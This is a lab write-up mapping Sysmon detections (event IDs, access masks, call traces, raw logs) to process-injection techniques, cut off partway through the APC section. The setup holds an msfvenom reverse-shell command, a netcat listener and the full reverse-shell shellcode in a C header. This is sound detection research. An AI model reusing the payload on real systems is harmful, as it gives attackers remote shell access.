# Process Injection Techniques with Sysmon Analysis
Sysmon is a kernel driver (SysmonDrv.sys) that registers callbacks directly with the Windows kernel. It's a low-level driver that registers callback routines with the Windows kernel. Whenever core system actions occur (e.g., a process launches, a network connection is attempted, or a driver loads), the kernel immediately notifies the Sysmon driver. It does not monitor userland DLLs like kernel32.dll or ntdll.dll. Instead it monitors kernel objects and events
at the lowest possible level below any userland bypass. The Sysmon service then runs in the background as a protected process. It receives data from the kernel driver, cross-references it with the user-defined rules in the configuration file, and formats the events into readable logs.

## TLDR: Final Lab Summary Process Injection Detection Coverage

### EIDs Coverage Per Technique
| Technique                        | EID 7 | EID 8 | EID 10 | EID 25 |
|----------------------------------|-------|-------|--------|--------|
| T1  Classic CRT                  | ❌    | ✅    | ✅     | ❌     |
| T2  NtCreateThreadEx             | ❌    | ✅    | ✅     | ❌     |
| T3  APC Early Bird               | ❌    | ❌    | ✅     | ❌     |
| T4  Process Hollowing            | ❌    | ❌    | ✅     | ✅     |
| T5  Direct Syscall               | ❌    | ✅    | ✅     | ❌     |
| T6  DLL Injection                | ✅    | ✅    | ✅     | ❌     |
| T7  Reflective DLL               | ❌    | ✅    | ✅     | ❌     |
| T8  Thread Hijacking             | ❌    | ❌    | ✅     | ❌     |
| T9  NtCreateSection              | ❌    | ✅    | ✅     | ❌     |
| T10 Module Stomping              | ✅    | ✅    | ✅     | ❌     |
| T11 Doppelganging                | ❌    | ❌    | ❌     | ❌     |
| T12 SetWindowsHookEx             | ✅    | ❌    | ❌     | ❌     |
| T13 AOE Injection                | ❌    | ✅    | ✅     | ❌     |
| T14 PE Injection                 | ❌    | ✅    | ✅     | ❌     |

---

### GrantedAccess Observed Values

| Technique                  | Observed Value | Comment                                              |
|----------------------------|----------------|------------------------------------------------------|
| T1  Classic CRT            | 0x1fffff       | Minimal value 0x143a possible                        |
| T2  NtCreateThreadEx       | 0x1fffff       | Minimal value 0x143a possible                        |
| T3  APC Early Bird         | 0x1fffff       | Minimal value 0x143a possible                        |
| T4  Process Hollowing      | 0x1fffff       | Minimal value 0x143a possible                        |
| T5  Direct Syscall         | 0x142a         | Kernel enforces exact rights, no Win32 promotion     |
| T6  DLL Injection          | 0x102a         | Kernel substitutes QUERY_INFO for QUERY_LIMITED      |
| T7  Reflective DLL (recon) | 0x1410         | Metasploit recon handle, VM_READ+QUERY_LTD only      |
| T7  Reflective DLL (inject)| 0x3fff         | Metasploit injection handle, near full access        |
| T8  Thread Hijacking       | 0x1428         | CREATE_THREAD (0x0002) absent, no thread created     | 
| T9  NtCreateSection        | 0x140a         | VM_WRITE (0x0020) absent, section mapping used       |
| T10 Module Stomping        | 0x143a         | Standard minimal injection rights                    |
| T11 Doppelganging          | -              | Failed lab attempt                                   |
| T12 SetWindowsHookEx       | -              | No OpenProcess, Windows dispatcher injects           |
| T13 AOE Injection          | 0x143a         | Standard minimal injection rights                    |                                          |
| T14 PE Injection           | 0x1fffff       | MAXIMUM_ALLOWED resolves to full access same user    |

## What each Sysmon Event ID catches

### EID 7 — Image Loaded
**Kernel callback:** `PsSetLoadImageNotifyRoutine`

The Windows kernel calls this routine every time any PE image (EXE, DLL, driver) is mapped into a process address space. Fires at the memory mapping level completely independent of which API was used to load the image.
LoadLibrary, LdrLoadDll, manual mapping all produce the same callback.
LoadLibraryA() called:
→ ntdll LdrLoadDll maps image into memory
→ kernel notifies PsSetLoadImageNotifyRoutine
→ Sysmon logs EID 7 with image path and hashes

### EID 8 — CreateRemoteThread
**Kernel callback:** `PsSetCreateThreadNotifyRoutine`

The Windows kernel calls this routine every time a thread object is created anywhere in the system. Fires at kernel object creation completely independent of
whether CreateRemoteThread, NtCreateThreadEx, or a direct syscall was used. All produce identical kernel thread objects.
Any thread creation API called:
→ syscall reaches kernel
→ kernel creates thread object
→ kernel notifies PsSetCreateThreadNotifyRoutine
→ Sysmon checks if thread is in a different process
→ if cross-process: logs EID 8

### EID 10 — ProcessAccess
**Kernel callback:** `ObRegisterCallbacks`

The Windows Object Manager calls this routine every time a handle to a process object is opened or duplicated. Fires at the handle creation level in the object manager completely independent of which API opened the handle.
OpenProcess, NtOpenProcess, direct syscall all produce the same object manager notification.
Any OpenProcess call made:
→ syscall reaches kernel object manager
→ object manager creates handle
→ object manager notifies ObRegisterCallbacks
→ Sysmon logs EID 10 with granted access mask

### EID 25 — ProcessTampering
**Kernel callback:** `PsSetCreateProcessNotifyRoutineEx`

Extended process notify routine that receives additional information about process state. Sysmon compares the in-memory image of a process against the on-disk file it was loaded from. Fires when the mapped image in memory no longer matches the file on disk.
Process created or image modified
→ kernel notifies PsSetCreateProcessNotifyRoutineEx
→ Sysmon reads mapped image from memory
→ Sysmon reads original file from disk
→ if mismatch: logs EID 25 Type: Image is replaced

## Process Access Rights Overview

| Value    | Breakdown                                                | Technique / Context                         |
|----------|----------------------------------------------------------|---------------------------------------------|
| 0x1fffff | PROCESS_ALL_ACCESS                                       | Lazy injectors, lab code, commodity malware |
| 0x143a   | VM_WRITE+VM_OP+CREATE_THREAD+QUERY                       | Classic CRT injection minimum               |
| 0x1410   | VM_WRITE+VM_READ+VM_OP                                   | Memory write, no thread creation            |
| 0x1010   | VM_READ+QUERY_LIMITED                                    | Reconnaissance, credential dumping          |
| 0x0040   | DUP_HANDLE                                               | Handle duplication attacks                  |
| 0x0800   | SUSPEND_RESUME                                           | Thread hijacking, context manipulation      |
| 0x0010   | VM_READ only                                             | Memory scraping, credential theft           |
| 0x0020   | VM_WRITE only                                            | Targeted memory patch                       |
| 0x0400   | QUERY_INFORMATION only                                   | Process reconnaissance                      |
| 0x1000   | QUERY_LIMITED_INFORMATION                                | Stealthy enumeration                        |
| 0x047a   | VM_WRITE+VM_OP+CREATE_THREAD+DUP_HANDLE                  | Injection with handle duplication           |
| 0x1f0fff | ALL_ACCESS older Windows builds                          | Pre-Win8 PROCESS_ALL_ACCESS variant         |
| 0x1f3fff | ALL_ACCESS alternate                                     | Seen in older Metasploit modules            |
| 0x0478   | VM_WRITE+VM_OP+DUP_HANDLE+QUERY                          | No thread creation APC or hijack path     |
| 0x1438   | VM_WRITE+VM_OP+SUSPEND_RESUME+QUERY                      | Thread hijacking injection                  |
| 0x0002   | CREATE_THREAD only                                       | Thread creation in already-written memory   |
| 0x0008   | VM_OPERATION only                                        | VirtualProtect changes, no write            |
| 0x101a   | VM_WRITE+VM_OP+VM_READ+QUERY_LIMITED                     | Reflective DLL injection pattern            |
| 0x147a   | VM_WRITE+VM_OP+CREATE_THREAD+DUP+QUERY+SUSPEND           | Full injection with suspend capability      |
| 0x102a   | VM_WRITE+VM_OP+CREATE_THREAD+QUERY_LIMITED               | T6 DLL injection, lab observed             |
| 0x142a   | VM_WRITE+VM_OP+CREATE_THREAD+QUERY+QUERY_LIMITED         | T5 direct syscall, lab observed            |
| 0x1c28   | VM_WRITE+VM_OP+SUSPEND+QUERY_LIMITED                     | T3 APC injection minimum                    |
| 0x1c2a   | VM_WRITE+VM_OP+CREATE_THREAD+SUSPEND+QUERY_LIMITED       | Full hijack with thread creation            |
| 0x1028   | VM_WRITE+VM_OP+QUERY_LIMITED                             | Write without thread creation               |
| 0x1038   | VM_WRITE+VM_OP+VM_READ+QUERY_LIMITED                     | Memory RW without thread                    |
| 0x103a   | VM_WRITE+VM_OP+VM_READ+CREATE_THREAD+QUERY_LIMITED       | Full minimal inject, QUERY_LIMITED variant |
| 0x042a   | VM_WRITE+VM_OP+CREATE_THREAD+QUERY_INFORMATION           | Requested minimum before kernel substitutes |
| 0x042b   | VM_WRITE+VM_OP+CREATE_THREAD+DUP+QUERY_INFORMATION       | Injection with handle dup QUERY variant     |
| 0x102b   | VM_WRITE+VM_OP+CREATE_THREAD+DUP+QUERY_LIMITED           | Handle dup minimal QUERY_LIMITED variant    |
| 0x1f1fff | ALL_ACCESS variant 2                                     | Some C2 framework variants                  |
| 0x1f2fff | ALL_ACCESS variant 3                                     | Some C2 framework variants                  |

### Detection Priority
| Priority | Values                              | Reason                               |
|----------|-------------------------------------|--------------------------------------|
| Critical | 0x1FFFFF;0x1F0FFF;0x1F3FFF          | All access, high risk                |
| High     | 0x143A;0x147A;0x102A;0x1C28         | Classic injection combos             |
| Medium   | 0x1410;0x1028;0x1038;0x103A;0x1438  | Memory ops without full access       |
| Medium   | 0x0040;0x0800;0x0478                | Handle dup and suspend paths         |
| Low      | 0x0010;0x0400;0x1000;0x0020         | Read/query alone for recon           |

## Sysmon CallTrace explained
CallTrace reads right to left with the rightmost entry is where execution started. UNKNOWN in calltrace means the code at that address has no associated PE module with raw code executing from VirtualAllocEx allocated memory and most often shellcode. All executables compiled with MinGW which show some KERNEL32 CRT noise in init for example: ntdll.dll+162164 (thread startup) -> KERNELBASE.dll+360c6 (mingw boilerplate) -> payload.exe+160b (main() function).

| CallTrace Origin          | Meaning                        | Suspicion  |
|---------------------------|--------------------------------|------------|
| app.exe+offset            | Named PE module                | Normal     |
| ntdll.dll+offset          | Thread startup boilerplate     | Normal     |
| KERNELBASE.dll+offset     | Windows API routing            | Normal     |
| UNKNOWN(address)          | Anonymous memory               | High       |

| CallTrace Pattern                         | Technique              |
|-------------------------------------------|------------------------|
| ntdll ← KERNELBASE ← KERNEL32 ← app.exe   | Normal Win32 API       |
| ntdll ← KERNELBASE ← app.exe              | Native API (ntdll)     |
| ntdll ← app.exe                           | Direct Syscall         |
| ntdll ← KERNELBASE ← KERNEL32 ← UNKNOWN   | Shellcode post-inject  |


## Windows Process Integrity
Lower integrity cannot open handles to higher integrity processes with write or execute rights. All lab injection attempts are made from Medium → Medium integrity process. Key for Cross-Integrity Injections is
SeDebugPrivilege which allows a process to open handles to any process regardless of integrity level.

### Integrity Levels
| Level  | Context                         |
|--------|---------------------------------|
| Low    | Untrusted sandboxed processes   |
| Medium | Standard user processes         |
| High   | Admin processes (UAC elevated)  |
| System | SYSTEM account processes        |

### API Level Cross-Integrity Injection Flow
| Step | Action                                                  |
|------|---------------------------------------------------------|
| 1    | OpenProcess(PROCESS_ALL_ACCESS, FALSE, system_pid)      |
| 2    | Kernel checks caller integrity vs target integrity      |
| 3    | Caller = Medium, target = System                        |
| 4    | Kernel returns ERROR_ACCESS_DENIED (0x5)                |
| 5    | hProc = NULL                                            |
| 6    | Injection stops — never generates Sysmon events         |

### Privilege Escalation Path Required for System Process Injection
| Step | Action                                                        |
|------|---------------------------------------------------------------|
| 1    | Start as standard user (Medium integrity)                     |
| 2    | Privesc via SeDebugPrivilege, token impersonation,            |
|      | kernel exploit, or UAC bypass                                 |
| 3    | Obtain SYSTEM or High integrity context                       |
| 4    | OpenProcess succeeds against system processes                 |
| 5    | Injection proceeds normally                                   |



## Lab setup
1. Installed Elastic with https://github.com/peasead/elastic-container
1. Windows 11 Host running ELK in WSL with local FW rules to push traffic through host to WSL
2. Windows 11 in VirtualBox with Elastic Agent, Sysmon v15.2 and sysmonconfig-olaf-filedelete.xml on bridged network
4. Kali VM as attacking machine on bridged network
5. Install mingw64 on VM, set ```$env:PATH += ";C:\msys64\mingw64\bin"```
6. Compile ```g++ t1_classic_crt.cpp -o t1_classic_crt.exe -lws2_32```

### Initialize common.h header with shellcode
On Kali run:
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=\<LOCAL IP\> LPORT=4444 -f c -b \x00\x0a\x0d
- nc -lvnp 4444

Then common header used for several of the techniques
```
#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdint.h>


unsigned char shellcode[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xf8\xd1\x23\xeb\xbe\xe7\xfa\x58\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x04\x99\xa0"
"\x0f\x4e\x0f\x3a\x58\xf8\xd1\x62\xba\xff\xb7\xa8\x09\xae"
"\x99\x12\x39\xdb\xaf\x71\x0a\x98\x99\xa8\xb9\xa6\xaf\x71"
"\x0a\xd8\x99\xa8\x99\xee\xaf\xf5\xef\xb2\x9b\x6e\xda\x77"
"\xaf\xcb\x98\x54\xed\x42\x97\xbc\xcb\xda\x19\x39\x18\x2e"
"\xaa\xbf\x26\x18\xb5\xaa\x90\x72\xa3\x35\xb5\xda\xd3\xba"
"\xed\x6b\xea\x6e\x6c\x7a\xd0\xf8\xd1\x23\xa3\x3b\x27\x8e"
"\x3f\xb0\xd0\xf3\xbb\x35\xaf\xe2\x1c\x73\x91\x03\xa2\xbf"
"\x37\x19\x0e\xb0\x2e\xea\xaa\x35\xd3\x72\x10\xf9\x07\x6e"
"\xda\x77\xaf\xcb\x98\x54\x90\xe2\x22\xb3\xa6\xfb\x99\xc0"
"\x31\x56\x1a\xf2\xe4\xb6\x7c\xf0\x94\x1a\x3a\xcb\x3f\xa2"
"\x1c\x73\x91\x07\xa2\xbf\x37\x9c\x19\x73\xdd\x6b\xaf\x35"
"\xa7\xe6\x11\xf9\x01\x62\x60\xba\x6f\xb2\x59\x28\x90\x7b"
"\xaa\xe6\xb9\xa3\x02\xb9\x89\x62\xb2\xff\xbd\xb2\xdb\x14"
"\xf1\x62\xb9\x41\x07\xa2\x19\xa1\x8b\x6b\x60\xac\x0e\xad"
"\xa7\x07\x2e\x7e\xa2\x00\x90\x89\x6a\xa7\xe2\x11\xeb\xbe"
"\xa6\xac\x11\x71\x37\x6b\x6a\x52\x47\xfb\x58\xf8\x98\xaa"
"\x0e\xf7\x5b\xf8\x58\xe9\x8d\xe3\x43\x9e\xd6\xbb\x0c\xb1"
"\x58\xc7\xa7\x37\x16\xbb\xe2\xb4\xa6\x05\xec\x41\x32\xb6"
"\xd1\x12\xb9\x22\xea\xbe\xe7\xa3\x19\x42\xf8\xa3\x80\xbe"
"\x18\x2f\x08\xa8\x9c\x12\x22\xf3\xd6\x3a\x10\x07\x11\x6b"
"\x62\x7c\xaf\x05\x98\xb0\x58\xe2\xaa\x04\x0d\xf5\x87\x18"
"\x2e\xf6\xa3\x37\x20\x90\x48\xb9\x89\x6f\x62\x5c\xaf\x73"
"\xa1\xb9\x6b\xba\x4e\xca\x86\x05\x8d\xb0\x50\xe7\xab\xbc"
"\xe7\xfa\x11\x40\xb2\x4e\x8f\xbe\xe7\xfa\x58\xf8\x90\x73"
"\xaa\xee\xaf\x73\xba\xaf\x86\x74\xa6\x8f\x27\x90\x55\xa1"
"\x90\x73\x09\x42\x81\x3d\x1c\xdc\x85\x22\xea\xf6\x6a\xbe"
"\x7c\xe0\x17\x23\x83\xf6\x6e\x1c\x0e\xa8\x90\x73\xaa\xee"
"\xa6\xaa\x11\x07\x11\x62\xbb\xf7\x18\x32\x15\x71\x10\x6f"
"\x62\x7f\xa6\x40\x21\x34\xee\xa5\x14\x6b\xaf\xcb\x8a\xb0"
"\x2e\xe9\x60\xb0\xa6\x40\x50\x7f\xcc\x43\x14\x6b\x5c\x0a"
"\xed\x5a\x87\x62\x51\x18\x72\x47\xc5\x07\x04\x6b\x68\x7a"
"\xcf\xc6\x5e\x84\xdb\xa3\x10\x5e\x92\xff\xe3\xbf\xc2\x51"
"\x84\xd4\xe7\xa3\x19\x71\x0b\xdc\x3e\xbe\xe7\xfa\x58";

SIZE_T shellcode_size = sizeof(shellcode);

// Helper: find PID by process name
DWORD GetPID(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}
```

## T1. Classic CreateRemoteThread
Opens a handle to a running process, writes shellcode into its memory space, then creates a new thread inside that process to execute it. All through documented Win32 API calls in kernel32.dll.  The four API calls and what Sysmon sees at each step:
| API Call               | Layer   | Sysmon Event |
|------------------------|---------|--------------|
| OpenProcess()          | Win32   | EID 10       |
| VirtualAllocEx()       | Win32   | -            |
| WriteProcessMemory()   | Win32   | -            |
| CreateRemoteThread()   | Win32   | EID 8        |

### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-12 11:15:16.217
SourceProcessGUID: {ED9BFE1B-0BC3-6A03-8E06-000000000A00}
SourceProcessId: 5856
SourceThreadId: 5232
SourceImage: C:\Users\jens\Documents\procInj\t1_classic_crt.exe
TargetProcessGUID: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
TargetProcessId: 7524
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+161fc4|C:\WINDOWS\System32\KERNELBASE.dll+42e76|C:\Users\jens\Documents\procInj\t1_classic_crt.exe+15d5|C:\Users\jens\Documents\procInj\t1_classic_crt.exe+10d9|C:\Users\jens\Documents\procInj\t1_classic_crt.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+8c3fc
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-12 11:15:16.217
SourceProcessGuid: {ED9BFE1B-0BC3-6A03-8E06-000000000A00}
SourceProcessId: 5856
SourceImage: C:\Users\jens\Documents\procInj\t1_classic_crt.exe
TargetProcessGuid: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
TargetProcessId: 7524
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 13228
StartAddress: 0x000002ED1B650000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-12 11:15:16.502
ProcessGuid: {ED9BFE1B-0BC4-6A03-9206-000000000A00}
ProcessId: 10416
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-E11B-6A02-743F-0B0000000000}
LogonId: 0xb3f74
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
ParentProcessId: 7524
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
ParentUser: WIN11\jens"

4. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-12 11:15:16.546
SourceProcessGUID: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
SourceProcessId: 7524
SourceThreadId: 13228
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-0BC4-6A03-9206-000000000A00}
TargetProcessId: 10416
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000002ED1B6501BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-12 11:15:22.115
ProcessGuid: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
ProcessId: 7524
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 56719
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon analysis
Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to catch event 1. Added ProcessInjectionDelux to cover all types of binary codes (  0x1FFFFF;0x1F0FFF;0x1F1FFF;0x1F2FFF;0x1F3FFF;0x143A;0x147A;0x047A;0x1410;0x1438;0x0478;0x1010;0x1410). Also csrss.exe opens handles to every process that starts or exits on the system so could need to exclude for less noise.

| Step | Action                                | Sysmon EID | Rule Triggered          |
|------|---------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad      | EID 10     | ProcessInjectionDelux   |
| 2    | Shellcode written to remote memory    | -          | -                       |
| 3    | CreateRemoteThread creates thread     | EID 8      | T1055 Process Injection |
| 4    | Shellcode opens handle to cmd.exe     | EID 10     | ProcessInjectionDelux   |
| 5    | Notepad spawns cmd.exe                | EID 1      | T1059.003 Cmd Shell     |
| 6    | Notepad beacons to C2                 | EID 3      | T1571 Non-Standard Port |

### Key Indicators
- **EID 8** `StartModule: -` thread starts from anonymous memory, not a
  named module. Strongest single indicator of shellcode execution.
- **EID 10** `GrantedAccess: 0x1fffff` PROCESS_ALL_ACCESS handle open.
  Caught by ProcessInjectionDelux rule.
- **EID 10** `CallTrace: UNKNOWN(address)` shellcode calling Win32 APIs
  from anonymous memory. Legitimate code always has a named module in trace.


## T2. Direct Native API
Calls NtCreateThreadEx directly from ntdll.dll instead of going through CreateRemoteThread in kernel32.dll. Internally, CreateRemoteThread is just a wrapper that eventually calls NtCreateThreadEx so the kernel sees the same event. EDRs typically place hooks at the top of each function in kernel32.dll and ntdll.dll. By skipping kernel32.dll entirely you bypass any hook placed on CreateRemoteThread. Sysmon sits in the kernel and should catch the threat creation event regardless.
| API Call            | Layer      | Sysmon Event |
|---------------------|------------|--------------|
| OpenProcess()       | Win32      | EID 10       |
| VirtualAllocEx()    | Win32      | -            |
| WriteProcessMemory()| Win32      | -            |
| NtCreateThreadEx()  | Native API | EID 8        |

### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-12 14:00:07.843
SourceProcessGUID: {ED9BFE1B-3266-6A03-B907-000000000A00}
SourceProcessId: 3628
SourceThreadId: 10800
SourceImage: C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe
TargetProcessGUID: {ED9BFE1B-3204-6A03-AD07-000000000A00}
TargetProcessId: 6512
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+161fc4|C:\WINDOWS\System32\KERNELBASE.dll+42e76|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+15d8|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+10d9|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+8c3fc
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-12 14:00:07.859
SourceProcessGuid: {ED9BFE1B-3266-6A03-B907-000000000A00}
SourceProcessId: 3628
SourceImage: C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe
TargetProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
TargetProcessId: 6512
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 6484
StartAddress: 0x000001A1101C0000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-12 14:00:08.433
ProcessGuid: {ED9BFE1B-3268-6A03-BD07-000000000A00}
ProcessId: 12136
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-E11B-6A02-743F-0B0000000000}
LogonId: 0xb3f74
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
ParentProcessId: 6512
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" 
ParentUser: WIN11\jens"

4. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-12 14:00:08.573
SourceProcessGUID: {ED9BFE1B-3204-6A03-AD07-000000000A00}
SourceProcessId: 6512
SourceThreadId: 6484
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-3268-6A03-BD07-000000000A00}
TargetProcessId: 12136
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000001A1101C01BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-12 14:00:10.572
ProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
ProcessId: 6512
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 49278
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"


### Sysmon Analysis
| Step | Action                               | Sysmon EID | Rule Triggered          |
|------|--------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad     | EID 10     | ProcessInjectionDelux   |
| 2    | Shellcode written to remote memory   | -          | -                       |
| 3    | NtCreateThreadEx creates thread      | EID 8      | T1055 Process Injection |
| 4    | Shellcode opens handle to cmd.exe    | EID 10     | ProcessInjectionDelux   |
| 5    | Notepad spawns cmd.exe               | EID 1      | T1059.003 Cmd Shell     |
| 6    | Notepad beacons to C2                | EID 3      | T1571 Non-Standard Port |

### Key Indicators
- **EID 10** `CallTrace: t2_ntcreatethreadex.exe+15d8` injector binary
  visible in call trace. Clean chain through ntdll and KERNELBASE into
  the injector with no UNKNOWN modules at this stage.
- **EID 8** `StartModule: -` thread starts from anonymous memory.
- **EID 10** `SourceThreadId: 6484` matches `NewThreadId: 6484` from
  EID 8 the injected thread is the one making subsequent API calls. Direct forensic link between thread creation and post-injection activity.


## T3. APC Queue Code Injection
Threads can execute code asynchronously by leveraging APC queues. It queues a function call to an existing thread in the target process rather than creating a new thread. For APC to execute the target thread must enter an alertable wait state via SleepEx, WaitForSingleObjectEx or similar and cannot force the victim thread to execute the injected code. This variant creates the target process suspended, queues the APC before any user code runs, then resumes. The main thread is alertable by default during initialisation.

| API Call            | Layer      | Sysmon Event |
|---------------------|------------|--------------|
| OpenProcess()       | Win32      | EID 10       |
| VirtualAllocEx()    | Win32      | -            |
| WriteProcessMemory()| Win32      | -            |
| OpenThread()        | Win32      | -            |
| QueueUserAPC()      | Win32      | -            |

### Sysmon Data
1."Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-13 08:36:47.379
SourceProcessGUID: {ED9BFE1B-381E-6A04-C402-000000000C00}
SourceProcessId: 10708
SourceThreadId: 3400
SourceImage: C:\Users\jens\Documents\procInj\t3_apc_injection.exe
